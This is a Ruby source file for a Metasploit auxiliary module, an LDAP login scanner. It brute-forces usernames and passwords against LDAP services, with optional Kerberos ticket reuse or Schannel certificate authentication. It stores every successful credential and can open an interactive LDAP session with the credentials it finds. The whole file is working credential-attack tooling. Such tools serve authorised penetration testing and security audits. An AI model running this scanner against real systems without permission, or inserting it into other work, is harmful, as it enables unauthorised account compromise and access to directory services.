##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'metasploit/framework/credential_collection'
require 'metasploit/framework/login_scanner/ldap'

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Scanner
  include Msf::Exploit::Remote::LDAP
  include Msf::Sessions::CreateSessionOptions
  include Msf::Auxiliary::CommandShell
  include Msf::Auxiliary::ReportSummary

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'LDAP Login Scanner',
        'Description' => 'This module attempts to login to the LDAP service.',
        'Author' => [ 'Dean Welch' ],
        'License' => MSF_LICENSE,
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => []
        }
      )
    )

    register_options(
      [
        OptBool.new(
          'APPEND_DOMAIN', [true, 'Appends `@<DOMAIN> to the username for authentication`', false],
          conditions: ['LDAP::Auth', 'in', [Msf::Exploit::Remote::AuthOption::AUTO, Msf::Exploit::Remote::AuthOption::PLAINTEXT]]
        ),
        OptInt.new('SessionKeepalive', [true, 'Time (in seconds) for sending protocol-level keepalive messages', 10 * 60])
      ]
    )

    # A password must be supplied unless doing anonymous login
    options_to_deregister = %w[BLANK_PASSWORDS]

    if framework.features.enabled?(Msf::FeatureManager::LDAP_SESSION_TYPE)
      add_info('The %grnCreateSession%clr option within this module can open an interactive session')
    else
      # Don't give the option to create a session unless ldap sessions are enabled
      options_to_deregister << 'CreateSession'
      options_to_deregister << 'SessionKeepalive'
    end

    deregister_options(*options_to_deregister)
  end

  def create_session?
    # The CreateSession option is de-registered if LDAP_SESSION_TYPE is not enabled
    # but the option can still be set/saved so check to see if we should use it
    if framework.features.enabled?(Msf::FeatureManager::LDAP_SESSION_TYPE)
      datastore['CreateSession']
    else
      false
    end
  end

  def run
    validate_connect_options!
    results = super
    logins = results.flat_map { |_k, v| v[:successful_logins] }
    sessions = results.flat_map { |_k, v| v[:successful_sessions] }
    print_status("Bruteforce completed, #{logins.size} #{logins.size == 1 ? 'credential was' : 'credentials were'} successful.")
    return results unless framework.features.enabled?(Msf::FeatureManager::LDAP_SESSION_TYPE)

    if create_session?
      print_status("#{sessions.size} LDAP #{sessions.size == 1 ? 'session was' : 'sessions were'} opened successfully.")
    else
      print_status('You can open an LDAP session with these credentials and %grnCreateSession%clr set to true')
    end
    results
  end

  def validate_connect_options!
    # Verify we can create arbitrary connect opts, this won't make a connection out to the real host - but will verify the values are valid
    get_connect_opts
  rescue Msf::ValidationError => e
    fail_with(Msf::Exploit::Remote::Failure::BadConfig, "Invalid datastore options for chosen auth type: #{e.message}")
  end

  def run_host(ip)
    ignore_public = datastore['LDAP::Auth'] == Msf::Exploit::Remote::AuthOption::SCHANNEL
    ignore_private =
      datastore['LDAP::Auth'] == Msf::Exploit::Remote::AuthOption::SCHANNEL ||
      (Msf::Exploit::Remote::AuthOption::KERBEROS && !datastore['ANONYMOUS_LOGIN'] && !datastore['PASSWORD'])

    cred_collection = build_credential_collection(
      username: datastore['USERNAME'],
      password: datastore['PASSWORD'],
      realm: datastore['DOMAIN'],
      anonymous_login: datastore['ANONYMOUS_LOGIN'],
      blank_passwords: false,
      ignore_public: ignore_public,
      ignore_private: ignore_private
    )

    opts = {
      domain: datastore['DOMAIN'],
      append_domain: datastore['APPEND_DOMAIN'],
      ssl: datastore['SSL'],
      proxies: datastore['PROXIES'],
      domain_controller_rhost: datastore['DomainControllerRhost'],
      ldap_auth: datastore['LDAP::Auth'],
      ldap_cert_file: datastore['LDAP::CertFile'],
      ldap_rhostname: datastore['Ldap::Rhostname'],
      ldap_krb_offered_enc_types: datastore['Ldap::KrbOfferedEncryptionTypes'],
      ldap_krb5_cname: datastore['Ldap::Krb5Ccname']
    }

    realm_key = nil
    if opts[:ldap_auth] == Msf::Exploit::Remote::AuthOption::KERBEROS
      realm_key = Metasploit::Model::Realm::Key::ACTIVE_DIRECTORY_DOMAIN
      if !datastore['ANONYMOUS_LOGIN'] && !datastore['PASSWORD']
        # In case no password has been provided, we assume the user wants to use Kerberos tickets stored in cache
        # Write mode is still enable in case new TGS tickets are retrieved.
        opts[:kerberos_ticket_storage] = kerberos_ticket_storage({ read: true, write: true })
      else
        # Write only cache so we keep all gathered tickets but don't reuse them for auth while running the module
        opts[:kerberos_ticket_storage] = kerberos_ticket_storage({ read: false, write: true })
      end
    end

    scanner = Metasploit::Framework::LoginScanner::LDAP.new(
      configure_login_scanner(
        host: ip,
        port: rport,
        cred_details: cred_collection,
        stop_on_success: datastore['STOP_ON_SUCCESS'],
        bruteforce_speed: datastore['BRUTEFORCE_SPEED'],
        connection_timeout: datastore['LDAP::ConnectTimeout'].to_i,
        framework: framework,
        framework_module: self,
        realm_key: realm_key,
        opts: opts,
        use_client_as_proof: create_session?
      )
    )

    successful_logins = []
    successful_sessions = []
    scanner.scan! do |result|
      credential_data = result.to_h
      credential_data.merge!(
        module_fullname: fullname,
        workspace_id: myworkspace_id,
        service_name: 'ldap',
        protocol: 'tcp'
      )
      if result.success?
        successful_logins << result
        if opts[:ldap_auth] == Msf::Exploit::Remote::AuthOption::SCHANNEL
          # Schannel auth has no meaningful credential information to store in the DB
          print_brute level: :good, ip: ip, msg: "Success: 'Cert File #{opts[:ldap_cert_file]}'"
        else
          create_credential_and_login(credential_data)
          print_brute level: :good, ip: ip, msg: "Success: '#{result.credential}'"
        end
        successful_sessions << create_session(result, ip) if create_session?
      else
        invalidate_login(credential_data)
        vprint_error "#{ip}:#{rport} - LOGIN FAILED: #{result.credential} (#{result.status}: #{result.proof})"
      end
    end
    { successful_logins: successful_logins, successful_sessions: successful_sessions }
  end

  private

  def create_session(result, ip)
    session_setup(result)
  rescue StandardError => e
    elog('Failed to setup the session', error: e)
    print_brute level: :error, ip: ip, msg: "Failed to setup the session - #{e.class} #{e.message}"
    result.connection.close unless result.connection.nil?
  end

  # @param [Metasploit::Framework::LoginScanner::Result] result
  # @return [Msf::Sessions::LDAP]
  def session_setup(result)
    return unless result.connection && result.proof

    # Create a new session
    my_session = Msf::Sessions::LDAP.new(result.connection, { client: result.proof, keepalive_seconds: datastore['SessionKeepalive'] })

    merge_me = {
      'USERPASS_FILE' => nil,
      'USER_FILE' => nil,
      'PASS_FILE' => nil,
      'USERNAME' => result.credential.public,
      'PASSWORD' => result.credential.private
    }

    start_session(self, nil, merge_me, false, my_session.rstream, my_session)
  end
end
